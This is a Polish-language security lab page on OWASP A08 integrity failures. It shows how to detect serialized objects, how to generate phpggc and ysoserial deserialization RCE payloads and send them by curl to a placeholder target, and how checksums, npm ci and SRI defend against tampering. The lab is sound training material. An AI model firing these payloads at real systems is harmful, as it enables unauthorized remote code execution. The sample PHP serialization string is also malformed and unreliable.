---
title: A08 — Software & Data Integrity Failures
sidebar_position: 8
tags: [lab, owasp-a08, deserialization, java, php]
---

# A08 — Software & Data Integrity Failures

## Zakres laboratorium

- Wykrywanie zserializowanych danych — identyfikacja zserializowanych obiektów Java, PHP i Python w żądaniach/odpowiedziach
- Deserializacja PHP — wstrzyknięcie obiektów i łańcuchy gadżetów phpggc
- Deserializacja Java — generowanie exploitów ysoserial
- Weryfikacja integralności pakietów — kontrole po stronie obronnej

## Konfiguracja

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
```

## Ćwiczenie 1: Wykrywanie zserializowanych danych

Zserializowane dane w ciasteczkach, parametrach lub treściach żądań to sygnał do zbadania podatności na deserializację.

### Zserializowane obiekty Java

Magiczne bajty: `rO0AB` (kodowanie base64 nagłówka serializacji Java `0xACED0005`)

```bash
# Sprawdź ciasteczka i treści odpowiedzi pod kątem magicznych bajtów serializacji Java
curl -sI "$TARGET" | grep -i "cookie" | grep -oP "[A-Za-z0-9+/=]{20,}" | while read TOKEN; do
  DECODED=$(echo "$TOKEN" | base64 -d 2>/dev/null | xxd | head -1)
  if echo "$DECODED" | grep -q "aced 0005"; then
    echo "[JAVA SERIALIZED OBJECT] Found in token: $TOKEN"
  fi
done
```

### Format serializacji PHP

Zserializowane obiekty PHP mają wzorzec `O:N:"ClassName":{properties}`:

```
O:4:"User":{2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"guest";}}
```

```bash
curl -s "$TARGET" | grep -oP 'O:[0-9]+:"[^"]+"\{.+?\}' | head -5
```

### Kody operacji pickle Python

Pliki pickle Pythona zaczynają się od `\x80\x02` do `\x80\x05`:

```bash
curl -s "$TARGET/api/data" | xxd | grep -E "^[0-9a-f]+: 80 0[2-5]"
```

## Ćwiczenie 2: Deserializacja PHP

### Koncepcja wstrzyknięcia obiektów

Jeśli aplikacja PHP deserializuje dane wejściowe kontrolowane przez użytkownika, a baza kodu zawiera klasy z magicznymi metodami (`__wakeup`, `__destruct`, `__toString`) wykonującymi niebezpieczne operacje, metody magiczne są wywoływane automatycznie podczas deserializacji.

### Łańcuchy gadżetów phpggc

phpggc generuje gotowe do użycia zserializowane payloady dla popularnych frameworków PHP:

```bash
# Wylistuj dostępne łańcuchy gadżetów
php /opt/phpggc/phpggc --list

# Łańcuch gadżetów Laravel RCE — wykonaj polecenie
php /opt/phpggc/phpggc Laravel/RCE1 system 'id' | base64

# Zapis pliku Symfony
php /opt/phpggc/phpggc Symfony/RCE4 system 'id' | base64

# Wyślij payload
PAYLOAD=$(php /opt/phpggc/phpggc Laravel/RCE1 system 'id' | base64)
curl -s "$TARGET/api/data" --cookie "session=$PAYLOAD"
```

Obsługiwane frameworki: Laravel, Symfony, Yii, Zend, Magento, WordPress, Drupal, Guzzle, Monolog.

## Ćwiczenie 3: Deserializacja Java

### Generowanie łańcucha gadżetów ysoserial

```bash
# Wylistuj dostępne łańcuchy gadżetów
java -jar /opt/ysoserial.jar

# Wygeneruj payload — CommonsCollections1 (popularny w starszych aplikacjach)
java -jar /opt/ysoserial.jar CommonsCollections1 'id' | base64 -w 0

# Inne popularne łańcuchy gadżetów
java -jar /opt/ysoserial.jar CommonsCollections2 'whoami' | base64 -w 0
java -jar /opt/ysoserial.jar Spring1 'id' | base64 -w 0
java -jar /opt/ysoserial.jar JBoss1 'id' | base64 -w 0
```

### Wysłanie payloadu do endpointu Java

```bash
PAYLOAD=$(java -jar /opt/ysoserial.jar CommonsCollections1 'id' 2>/dev/null | base64 -w 0)

curl -s -X POST "$TARGET/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  -d "$PAYLOAD"
```

Dostępne łańcuchy gadżetów: CommonsCollections1–7, Spring1–2, JBoss1–6, Hibernate, Groovy, BeanShell.

## Ćwiczenie 4: Integralność pakietów (obrona)

### Weryfikacja pliku SHA-256

Zawsze weryfikuj pobrane pliki binarne względem opublikowanych sum kontrolnych:

```bash
# Pobierz plik i jego sumę kontrolną
wget https://example.com/tool.tar.gz
wget https://example.com/tool.tar.gz.sha256

# Zweryfikuj
sha256sum -c tool.tar.gz.sha256
```

### npm — użyj pliku lockfile do odtwarzalnych instalacji

```bash
# npm ci instaluje dokładnie to, co jest w package-lock.json, bez rozwiązywania zależności
npm ci
```

Używanie `npm install` w CI pozwala na rozwiązywanie zależności do nowszych (potencjalnie skompromitowanych) wersji.

### Subresource Integrity (SRI) dla skryptów przeglądarki

Podczas ładowania skryptów stron trzecich w HTML, zawsze dołączaj atrybut `integrity`:

```html
<script
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

Jeśli CDN zostanie skompromitowane i plik ulegnie zmianie, przeglądarki odmówią jego wykonania. Generuj skróty SRI na [srihash.org](https://www.srihash.org/).
